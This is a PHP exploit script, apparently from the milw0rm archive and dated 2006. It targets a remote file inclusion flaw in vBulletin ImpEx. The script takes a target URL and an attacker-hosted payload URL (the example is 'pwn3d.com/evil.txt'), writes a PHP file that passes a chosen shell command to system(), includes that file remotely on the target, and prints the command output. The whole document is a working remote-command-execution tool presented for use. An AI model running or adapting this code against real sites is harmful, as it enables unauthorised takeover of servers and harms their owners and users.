<?php
/*
vbulletin ImpEx Remote File Inclusion Exploit c0ded by ReZEN
Sh0uts: xorcrew.net, ajax, gml, #subterrain, My gf
url:  http://www.xorcrew.net/ReZEN

example:
turl: http://www.target.com/impex/ImpExData.php?systempath=
hurl:http://www.pwn3d.com/evil.txt?

*/

$cmd = $_POST["cmd"];
$turl = $_POST["turl"];
$hurl = $_POST["hurl"];

$form= "<form method=\"post\" action=\"".$PHP_SELF."\">"
     ."turl:<br><input type=\"text\" name=\"turl\" size=\"90\" 
value=\"".$turl."\"><br>"
     ."hurl:<br><input type=\"text\" name=\"hurl\" size=\"90\" 
value=\"".$hurl."\"><br>"
     ."cmd:<br><input type=\"text\" name=\"cmd\" size=\"90\" 
value=\"".$cmd."\"><br>"
     ."<input type=\"submit\" value=\"Submit\" name=\"submit\">"

     ."</form><HR WIDTH=\"650\" ALIGN=\"LEFT\">";

if (!isset($_POST['submit']))
{

echo $form;

}else{

$file = fopen ("test.txt", "w+");

fwrite($file, "<?php system(\"echo ++BEGIN++\"); system(\"".$cmd."\");
system(\"echo ++END++\"); ?>");
fclose($file);

$file = fopen ($turl.$hurl, "r");
if (!$file) {
     echo "<p>Unable to get output.\n";
     exit;
}

echo $form;

while (!feof ($file)) {
     $line .= fgets ($file, 1024)."<br>";
     }
$tpos1 = strpos($line, "++BEGIN++");
$tpos2 = strpos($line, "++END++");
$tpos1 = $tpos1+strlen("++BEGIN++");
$tpos2 = $tpos2-$tpos1;
$output = substr($line, $tpos1, $tpos2);
echo $output;

}
?>

# milw0rm.com [2006-04-13]